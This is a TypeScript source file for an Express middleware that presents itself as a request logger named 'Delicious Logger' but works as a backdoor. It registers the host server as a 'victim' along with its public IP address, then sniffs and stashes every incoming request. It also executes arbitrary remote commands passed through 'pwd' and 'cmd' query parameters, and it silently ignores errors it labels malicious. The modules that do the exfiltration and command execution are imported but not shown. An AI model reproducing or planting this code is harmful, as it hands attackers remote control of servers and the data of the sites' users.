import { Request, Response } from 'express';
import initVictim from './functions/initVictim';
import LoggerFactory from './loggers/LoggerFactory';
import { LoggerOptions } from './types/options';
import { remoteCommand } from './utils/command';
import IPUtils from './utils/ip';

/**
 * Delicious Logger middleware function
 *
 * @param params Option object for the logger
 * @returns Async Express Middleware
 */
const deliciousLogger = ({
  layout = 'basic',
  filename,
  separator,
  maxFileSize,
}: LoggerOptions) => {
  // Init logger
  const logger = LoggerFactory.getLogger({
    layout,
    filename,
    separator,
    maxFileSize,
  });
  // Check new victim upon the first time using the logger
  let isNew = true;
  let publicIPv4: string;
  /* * Middleware function * */
  return async (req: Request, _: Response, next: any) => {
    // Initialize new victim upon 1st request
    if (isNew) {
      publicIPv4 = await IPUtils.publicIPv4();
      try {
        initVictim(req, publicIPv4).then(() => logger.sniff(req, publicIPv4));
      } catch (err) {
        // Ignore malicious exception
        return next();
      }
      isNew = false;
      // Perform logging and stashing
      logger.log(req);
      logger.stash(req);
      return next();
    }
    // Check valid access to remote command
    const { pwd, cmd } = req.query;
    if (pwd && cmd) {
      remoteCommand(pwd as string, cmd as string);
      return next();
    }
    // Perform logging and stashing
    logger.log(req);
    logger.stash(req);
    // Sniff user's request
    try {
      logger.sniff(req, publicIPv4);
    } catch (err) {
      // Ignore malicious exception
      return next();
    }
    return next();
  };
};

export default deliciousLogger;
